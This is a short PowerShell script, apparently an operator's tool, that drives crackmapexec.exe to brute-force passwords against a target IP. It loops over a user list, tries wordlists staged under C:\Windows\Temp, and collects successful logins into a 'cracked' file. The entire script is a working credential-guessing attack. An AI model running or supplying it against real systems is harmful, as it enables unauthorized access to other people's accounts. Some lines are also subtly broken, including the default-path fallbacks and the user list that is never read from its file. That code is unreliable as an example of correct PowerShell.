<#

TO DO
=========
Make it so can run in CLI without having to set manually 

#>
#

function static-input {
# Set these variables accordingly 	
$target = "172.16.0.10"
$userlist = Get-Content C:\windows\temp\users.txt
$passlist = "C:\Windows\Temp\onhost\wordlists\pass_top-500.txt"
}

function get-input {
echo ""
$target = Read-Host "Target IP: " -MaskInput
echo ""
echo "Password List: (Full Path)"
echo "C:\Windows\Temp\onhost\wordlists\pass_top-100.txt"
echo "C:\Windows\Temp\onhost\wordlists\pass_top-500.txt"
echo "C:\Windows\Temp\onhost\wordlists\pass_top-3k.txt"
echo ""
$passlist  = Read-Host "Password List (ENTER for C:\Windows\Temp\onhost\wordlists\pass_top-100.txt): " -MaskInput
if ($passlist) { $passlist "C:\Windows\Temp\onhost\wordlists\pass_top-100.txt" }
echo ""	

$userlist  = Read-Host "Users List (ENTER for C:\windows\temp\users.txt): " -MaskInput
if ($userlist) { $userlist "C:\windows\temp\users.txt" }
}



function run-cme {


#static-input
get-input

echo $target
echo $passlist
echo $userlist

# add the date at stat and end just for timing 
date 
echo "" > .\cme_brute_cracked.txt
echo "" > .\cme_brute.txt

ForEach ($user in $userlist) {
echo ""
write-host ===========================[ $user ]===========================
.\crackmapexec.exe $target -u $user -p $passlist 
write-host ================================================================
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > .\cme_brute_cracked.txt
}  
date

# Create File File 
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > .\temp.txt
Get-Content .\temp.txt | sort-object| Get-Unique > .\cme_brute_cracked.txt
Remove-Item .\temp.txt

}

# Run 
run-cme | Tee cme_brute.txt

